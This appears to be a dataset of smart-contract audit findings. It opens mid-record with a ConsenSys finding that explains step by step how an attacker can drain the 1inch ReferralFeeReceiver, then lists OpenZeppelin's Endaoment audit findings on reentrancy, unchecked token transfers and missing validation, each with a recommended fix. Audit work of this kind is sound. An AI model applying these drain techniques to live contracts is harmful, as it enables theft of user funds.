token.epochBalance[currentEpoch].token1Balance = tokens[1].uniBalanceOf(address(this)).sub(token1Balance);\n    token.currentEpoch = currentEpoch.add(1);\n}\n\n```\n3. A call to `claimFrozenEpoch` checks-out the previously frozen token balance.\n\n\n* The `claim > 0` requirement was fulfilled in step 1.\n* The token balance was prepared for the attacker-controlled token (`ATTK`) in step 2, but were now checking out `DAI`.\n* When the contract calls out to the attackers `mooniswap` contract the call to `IERC20[] memory tokens = mooniswap.getTokens();` returns the address of the token to be stolen (e.g. `DAI`) instead of the attacker-controlled token (`ATTK`) that was used to set-up the balance records.\n* Subsequently, the valuable target tokens (`DAI`) are sent out to the caller in `_transferTokenShare`.\n\n\n**code/contracts/ReferralFeeReceiver.sol:L153-L162**\n\n\n\n```\nif (share > 0) {\n    EpochBalance storage epochBalance = token.epochBalance[firstUnprocessedEpoch];\n    uint256 totalSupply = epochBalance.totalSupply;\n    user.share[mooniswap][firstUnprocessedEpoch] = 0;\n    epochBalance.totalSupply = totalSupply.sub(share);\n\n    IERC20[] memory tokens = mooniswap.getTokens();\n    epochBalance.token0Balance = \\_transferTokenShare(tokens[0], epochBalance.token0Balance, share, totalSupply);\n    epochBalance.token1Balance = \\_transferTokenShare(tokens[1], epochBalance.token1Balance, share, totalSupply);\n    epochBalance.inchBalance = \\_transferTokenShare(inchToken, epochBalance.inchBalance, share, totalSupply);\n\n```\n#### Recommendation\n\n\nEnforce that the user-provided `mooniswap` contract was actually deployed by the linked factory. Other contracts cannot be trusted. Consider implementing token sorting and de-duplication (tokenA!=tokenB) in the pool contract constructor as well. Consider employing a reentrancy guard to safeguard the contract from reentrancy attacks.\n\n\nImprove testing. The methods mentioned here are not covered at all. Improve documentation and provide a specification that outlines how this contract is supposed to be used.\n\n\nReview the additional notes provided with this issue.",
      "summary": "\nThis bug report is regarding the ReferralFeeReceiver contract, which receives pool shares when users swap tokens in the pool. A malicious user can drain all token by calling claimFrozenEpoch with a custom contract as mooniswap that returns a token address the ReferralFeeReceiver contracts holds token from in IERC20[] memory tokens = mooniswap.getTokens(). The attacker can also manipulate the frozen tokenbalances by providing a malicious mooniswap contract.\n\nThe issue was raised in components that were being affected by the scope reduction and are, therefore, only shallowly validated. The developer team has reported a fix in 1inch-exchange/1inch-liquidity-protocol#2 and the reentrancy in FeeReceiver in 1inch-exchange/[emailprotected]`e9c6a03`, however this has not been verified by Diligence.\n\nThe recommended fix is to enforce that the user-provided mooniswap contract was actually deployed by the linked factory. Other contracts cannot be trusted. Consider implementing token sorting and de-duplication (tokenA!=tokenB) in the pool contract constructor as well. Consider employing a reentrancy guard to safeguard the contract from reentrancy attacks. Additionally, improve testing and provide a specification that outlines how this contract is supposed to be used.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "1inch Liquidity Protocol",
      "source_link": "https://consensys.net/diligence/audits/2020/12/1inch-liquidity-protocol/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "11296",
      "title": "[L10] Incorrect require statement",
      "impact": "LOW",
      "content": "**Update:** *Fixed in [pull request #56](https://github.com/endaoment/endaoment-contracts/pull/56).*\n\n\nIn the [`Administratable`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Administratable.sol) contract the [`onlyAdminOrRole` modifier in line 48](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Administratable.sol#L48) is requiring the `msg.sender` to be the `ADMIN` address of the `EndaomentAdmin` contract, but this statement is inside an conditional structure with the condition that the [`msg.sender` is not the `ADMIN`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Administratable.sol#L33).  \n\nSo the `require` statement will be never satisfied and will always revert if evaluated.\n\n\nThis `require` statement should reflect that the caller is not the `ADMIN` or that the role requested is paused and should therefore be a `revert` with an explicative error message if the `else` block is evaluated.\n\n\nConsider refactoring the conditional statements by providing a cleaner structure, and reverting when the caller is accessing to a paused role and its not the `ADMIN`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11295",
      "title": "[L09] Missing getter",
      "impact": "LOW",
      "content": "**Update:** *Fixed in [pull request #55](https://github.com/endaoment/endaoment-contracts/pull/55).*\n\n\nThe [`_newPotentialOwner` private state variable](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/EndaomentAdmin.sol#L21) of the `TwoStepsOwnable` contract is missing a getter function to read its value.\n\n\nTo have access to this state variable without parsing the contract storage in the blockchain, consider adding a agetter function to retrieve its value.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11294",
      "title": "[L08] Lack of event emission",
      "impact": "LOW",
      "content": "**Update:** *Fixed in [pull request #52](https://github.com/endaoment/endaoment-contracts/pull/52).*\n\n\nThe [`changeManager`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L62), [`createGrant`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L100), [`finalizeGrant`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L119) functions of the `Fund` contract, the [`claimRequest`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L58) and the [`setOrgWallet`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L99) functions of the `Org` contract are not emitting any event after changing the value of state variables.\n\n\nTo easily inform clients about state changes in the contract and to let the applications subscribe to such changes, consider always emitting an event when changing important parameters of each contract.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11293",
      "title": "[L07] Useless input parameters",
      "impact": "LOW",
      "content": "**Update:** *Fixed in [pull request #66](https://github.com/endaoment/endaoment-contracts/pull/66).*\n\n\nIn the [`claimRequest`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L58) function of the `Org` contract, the `orgAdminAddress` is passed as input parameter. [In line 60](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L60) then, the `msg.sender` is required to be the same address as the `orgAdminAddress`.  \n\nThe same happens with the `fSub` parameter which is required, in [line 59](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L59) to be `true`.\n\n\nThe function is `public` and anyone can call it. The `msg.sender` can freely choose their address as `orgAdminAddress` and `fSub` as `true`.\n\n\nGiven the fact that the `orgAdminAddress` and `fSub` are not used for any other purpose we can conclude that the require statements in line 59 and 60 are useless and so the `orgAdminAddress` and `fSub` arguments. Consider removing them.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11292",
      "title": "[L06] Multiple getters for the same state variable",
      "impact": "LOW",
      "content": "**Update:** *Fixed in [pull request #73](https://github.com/endaoment/endaoment-contracts/pull/73).*\n\n\nSome contracts in the code base contain multiple public getter functions for the same state variable.\n\n\nFor example:\n\n\n* In the `FundFactory` contract, the automatically generated getter for the `public` [`createdFunds`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/FundFactory.sol#L20) array is duplicated by the explicit [`getFund`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/FundFactory.sol#L53) getter.\n* In the `OrgFactory` contract, the automatically generated getters for the `public` [`allowedOrgs`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/OrgFactory.sol#L20) mapping and the [`deployedOrgs`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/OrgFactory.sol#L19) array are duplicated by the explicit [`getAllowedOrg`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/OrgFactory.sol#L62) and [`getDeployedOrg`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/OrgFactory.sol#L54) getters.\n\n\nTo avoid duplication, ensure that there is at most one publicly exposed getter for each contract state variable. Consider making all the state variables private, following the style of the openzeppelin-contracts package.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11291",
      "title": "[L05] Misleading docstrings",
      "impact": "LOW",
      "content": "**Update:** *Partially fixed in [pull request #78](https://github.com/endaoment/endaoment-contracts/pull/78). Most of the docstrings have been fixed, some of them have been added or refactored.*\n\n\nSeveral docstrings throughout the code base were found to contain misleading information and should be fixed. In particular:\n\n\n* [Line 16 of the `Fund`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L16) contract is incorrectly assuming that the token transfer is done using the `SafeMath` library, but since the token address used to do the transfer [is arbitrary](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L119), then the `transfer` implementation can be different and then the assumption doesnt hold.\n* [Lines 14,15 and 16](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/FundFactory.sol#L14-L16) of the `FundFactory` contract state that it provides a way for fetching individual `Org` contract addresses and a list of `allowedOrgs` but there is no way of retrieving such information from the contract.\n* [Lines 231 and 232 of the `EndaomentAdmin` contract](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/EndaomentAdmin.sol#L231-L232) are stating that the permitted roles to pass the modifiers restrictions have to be a bot commander (0) or a pauser (1). In reality, the modifier can be called with any of the [six roles permitted](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/interfaces/IEndaomentAdmin.sol#L13) and it only checks if that role exists or if its paused. Moreover its not clear what bot commander means.\n* [Line 182](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/EndaomentAdmin.sol#L182), [172](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/EndaomentAdmin.sol#L172) and [158](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/EndaomentAdmin.sol#L158) of the `EndaomentAdmin` contract say External when the function visibility is `public`.\n* [Lines 27 an 28](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Administratable.sol#L27-L28) of the `Administratable` contract, the comment says that the only admitted roles are `ADMIN`, `ACCOUNTANT` and `REVIEWER` while the modifier actually checks also for the `FUND_FACTORY` and `ORG_FACTORY` roles.\n* [Line 184](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/EndaomentAdmin.sol#L184) of the `EndaomentAdmin` contract says `admin` where it should be the `holder` or `roleAddress` as the returned named parameter. The same happens in the [`IEndaomentAdmin.getRoleAddress`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/interfaces/IEndaomentAdmin.sol#L33) function definition.\n* [Line 79](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L79) and [116](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L116) of the `Fund` contract and [line 88](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L88) of the `Org` contract are mentioning stablecoins. There is actually no restriction on the type of `ERC20` tokens that can be passed as input parameter in the functions making use of them and any mention should therefore be removed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11290",
      "title": "[L04] SafeMath library is not used",
      "impact": "LOW",
      "content": "**Update:** *Fixed in [pull request #54](https://github.com/endaoment/endaoment-contracts/pull/54).*\n\n\nIn the code base, the `SafeMath` contract library is declared to be used against `uint256` variables in the [`Fund`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L20) contract, but then its not used in [lines 127-128](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L127-L128).\n\n\nTo avoid any possible underflow/overflow or division by zero, consider always relying on the proven safety of the [`SafeMath` library by OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol) and using it when performing mathematical operations. Also consider removing [line 19 of the `Org` contract](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L19) if the contract doesnt need to perform calculations.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11289",
      "title": "[L03] Missing docstrings",
      "impact": "LOW",
      "content": "**Update:** *Fixed in [pull request #47](https://github.com/endaoment/endaoment-contracts/pull/47). Moreover some of the mentioned functions are not existing anymore or they have been refactored.*\n\n\nThe [`setOrgWallet`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L99), [`getTokenBalance`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L103) and the [`getClaimsCount`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L110) functions of the `Org` contract are lacking any sort of docstrings.\n\n\nThis hinders understanding of the codes intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance.\n\n\nConsider thoroughly documenting the missing functions (and their parameters) that are part of the contracts public API.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11288",
      "title": "[L02] README file is missing important information",
      "impact": "LOW",
      "content": "**Update:** *Fixed in [pull request #60](https://github.com/endaoment/endaoment-contracts/pull/60).*\n\n\nThe [README.md of the Endaoment project](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/README.md) has little information about what is the purpose of the project nor how to use it. README files on the root of git repositories are the first documents that most developers often read, so they should be complete, clear, concise, and accurate.\n\n\nConsider following [Standard Readme](https://github.com/RichardLitt/standard-readme) to define the structure and contents for the README file.  \n\nAlso, consider including an explanation of the core concepts of the repository, the usage workflows, the public APIs and how the code relates to other key components of the project.\n\n\nFurthermore, it is highly advisable to include instructions for the [responsible disclosure](https://en.wikipedia.org/wiki/Responsible_disclosure) of any security vulnerabilities found in the project.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11287",
      "title": "[L01] Missing error messages",
      "impact": "LOW",
      "content": "**Update:** *Fixed in [pull request #53](https://github.com/endaoment/endaoment-contracts/pull/53).*\n\n\nThere are several require statements in the `Fund` and `EndaomentAdmin` contracts without error messages. In particular:\n\n\n* In [line 188](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/EndaomentAdmin.sol#L188) of the `EndaomentAdmin` contract.\n* In [line 43](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L43), [52](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L52),[101](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L101) and [123](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L123) of the `Fund` contract.\n\n\nConsider including specific and informative error messages in all require statements.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11286",
      "title": "[M02] Non flexible data objects",
      "impact": "MEDIUM",
      "content": "**Update:** *Fixed in [pull request #75](https://github.com/endaoment/endaoment-contracts/pull/75).*\n\n\nSome data objects used in the code like the [`grants[]`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L33) of the `Fund` contract, the [`allowedOrgs`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/OrgFactory.sol#L20) of the `OrgFactory` contract, or the [`claims[]`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L33) of the `Org` contract are all lacking of auxiliary functions to modify their elements after creation.\n\n\nIn particular, allowed organizations cant be disallowed, grants cant be modified nor deleted after being finalized, and organization claims cant be modified.\n\n\nMoreover, `claims[]` and `grants[]` have no protection from duplicates when new elements are added.\n\n\nIn order to handle unexpected errors and increase the flexibility of the system, consider adding auxiliary functions, with the proper access restriction, to modify and delete, when necessary, such objects from the arrays or mappings.  \n\nAlso consider adding a duplicate protection to the arrays using a key-value mapping to rapidly check if an element has been already added or not.",
      "summary": "\nThis bug report is about data objects used in code, such as grants, allowedOrgs, and claims, that lack auxiliary functions to modify their elements after creation. As a result, allowed organizations cannot be disallowed, grants cannot be modified or deleted, and organization claims cannot be modified. Additionally, there is no protection from duplicates when new elements are added. To fix this, consider adding auxiliary functions with the proper access restriction to modify and delete when necessary, as well as a duplicate protection using a key-value mapping to rapidly check if an element has been already added. This bug has now been fixed in pull request #75.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11285",
      "title": "[M01] Lack of input validation",
      "impact": "MEDIUM",
      "content": "**Update:** *Fixed in [pull request #74](https://github.com/endaoment/endaoment-contracts/pull/74).*\n\n\nThere is a general lack of input validation in the entire code base. Some examples are:\n\n\n* The [`onlyAdmin`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Administratable.sol#L17) and [`onlyAdminOrRole`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Administratable.sol#L30) modifiers, the [`changeManager`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L62), [`finalizeGrant`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L119), [`checkRecipient`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L71) and [`getSummary`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L81) of the `Fund` contract and the [`cashOutOrg`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L91) and [`setOrgWallet`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L99) of the `Org` contract, are not checking whether the addresses passed as input parameter are the zero address.\n* The [`createGrant`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L100) function of the `Fund` contract doesnt check any of the grant input parameters before creating a `grant` and push it into the `grants` array. Only the recipient is checked to be an allowed organization.\n* The [constructor of the `Org` contract](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L44) is not checking if the passed `ein` value is zero.\n* The [`claimRequest`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L58) function of the `Org` contract is not validating if the `fName`, `lName` and `eMail` parameters are empty.\n* The [`approveClaim`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L79) function of the `Org` contract and the [`finalizeGrant`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L119) of the `Fund` contract are not checking if the `index` parameter is accessing to a non existing element in the corresponding array.\n\n\nThe lack of validation on user-controlled parameters may result in erroneous or failing transactions. Note also that some user interfaces may default to sending null parameters if none are specified.\n\n\nConsider reviewing the entire code base and add input validations, especially when an user-controlled input parameter is used to store a value in the contracts.",
      "summary": "\nThis bug report is about the lack of input validation in the code base of Endaoment Contracts. This could lead to erroneous or failing transactions, as some user interfaces may default to sending null parameters if none are specified. Examples of this lack of input validation include The `onlyAdmin` and `onlyAdminOrRole` modifiers, the `changeManager`, `finalizeGrant`, `checkRecipient` and `getSummary` of the `Fund` contract and the `cashOutOrg` and `setOrgWallet` of the `Org` contract, which are not checking whether the addresses passed as input parameter are the zero address. Additionally, the `createGrant` function of the `Fund` contract doesnt check any of the grant input parameters before creating a `grant` and pushing it into the `grants` array. The constructor of the `Org` contract is not checking if the passed `ein` value is zero. The `claimRequest` function of the `Org` contract is not validating if the `fName`, `lName` and `eMail` parameters are empty. Lastly, the `approveClaim` function of the `Org` contract and the `finalizeGrant` of the `Fund` contract are not checking if the `index` parameter is accessing to a non existing element in the corresponding array. \n\nTo fix this bug, it is recommended to review the entire code base and add input validations, especially when an user-controlled input parameter is used to store a value in the contracts. The bug has since been fixed in pull request #74.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11284",
      "title": "[H03] Token transfers can silently fail",
      "impact": "HIGH",
      "content": "**Update:** *Fixed in [pull request #69](https://github.com/endaoment/endaoment-contracts/pull/69).*\n\n\nThe [`finalizeGrant`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L119) function of the `Fund` contract and the  \n\n[`cashOutOrg`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L91) function of the `Org` contract are both doing token `transfers` from the contract to some recipients.\n\n\nIn both cases, the `balanceOf(sender)` is not checked to be greater than `0` or greater or equal than the amount that is going to be transferred to the recipient.  \n\nMoreover, the returned values of the `transfer` methods, if present, are not checked.\n\n\nIf the transfer fails without reverting the transaction, [an event is emitted](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L96) or a [grant is erroneously marked as completed](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L133).\n\n\nTo avoid finalizing grants without actually transferring tokens to the recipient organization, consider always checking the result of a token transfer and to validate first the amount to be transferred. This could also save some gas by not emitting unnecessary events.",
      "summary": "\nThis bug report is about two functions in the `Fund` and `Org` contracts. The `finalizeGrant` function of the `Fund` contract and the `cashOutOrg` function of the `Org` contract are both doing token transfers from the contract to some recipients. However, the `balanceOf(sender)` is not checked to be greater than `0` or greater or equal than the amount that is going to be transferred to the recipient, and the returned values of the `transfer` methods, if present, are not checked. This can lead to an event being emitted or a grant being erroneously marked as completed. \n\nTo fix this issue, it is recommended to always check the result of a token transfer and to validate first the amount to be transferred. This could also save some gas by not emitting unnecessary events. The bug was fixed in pull request #69.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11283",
      "title": "[H02] Not following the Checks-Effects-Interactions pattern",
      "impact": "HIGH",
      "content": "**Update:** *Fixed in [pull request #63](https://github.com/endaoment/endaoment-contracts/pull/63).*\n\n\nThe [`finalizeGrant`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L119) function of the `Fund` contract is setting the `grant.complete` storage variable [after a token `transfer`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L133).\n\n\n[Solidity recommends the usage of the Check-Effects-Interaction Pattern](https://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) to avoid potential security issues, such as reentrancy.\n\n\nThe `finalizeGrant` function can be used to conduct a reentrancy attack, where the [`token transfer in line 129`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L129) can call back again the same function, sending to the `admin` multiple times an amount of `fee`, [before setting the `grant` as completed](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L133).\n\n\nIn this way the `grant.recipient` can receive less than expected and the contract funds can be drained unexpectedly leading to an unwanted loss of funds.\n\n\nConsider always following the Check-Effects-Interactions pattern, thus modifying the contracts state before making any external call to other contracts.",
      "summary": "\nThis bug report is about the `finalizeGrant` function of the `Fund` contract. This function allows for a reentrancy attack, which could lead to an unexpected loss of funds. A reentrancy attack occurs when the `token transfer` in line 129 of the `Fund` contract calls back the same function, sending multiple times an amount of `fee` to the `admin` before setting the `grant` as completed. This could result in the `grant.recipient` receiving less than expected and the contract funds being drained.\n\nTo avoid potential security issues, Solidity recommends the usage of the Check-Effects-Interaction Pattern. This pattern requires that contract states are modified before any external call to other contracts is made.\n\nThe bug was fixed in pull request #63.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11282",
      "title": "[H01] Unsupported ERC20 tokens can be stuck in the contract",
      "impact": "HIGH",
      "content": "**Update:** *Fixed in [pull request #68](https://github.com/endaoment/endaoment-contracts/pull/68).*\n\n\n[Contract interfaces](https://solidity.readthedocs.io/en/latest/contracts.html#interfaces) are contracts that declare function signatures without implementing them. They are used as an specification that decouples the signature of the functions from their implementation, allowing to interoperate with different implementations as long as they adhere to the specification.  \n\nIn the codebase, the `ERC20` token implementation by OpenZeppelin [is used](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L7) in the [`Fund`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L124-L131) and [`Org`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L95) contracts, instead of using the interface.  \n\nThe address of the `ERC20` token to be used [is passed as input parameter](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L91).\n\n\nGiven the fact that one can pass arbitrary addresses whether or not they represent valid `ERC20` tokens and that not every 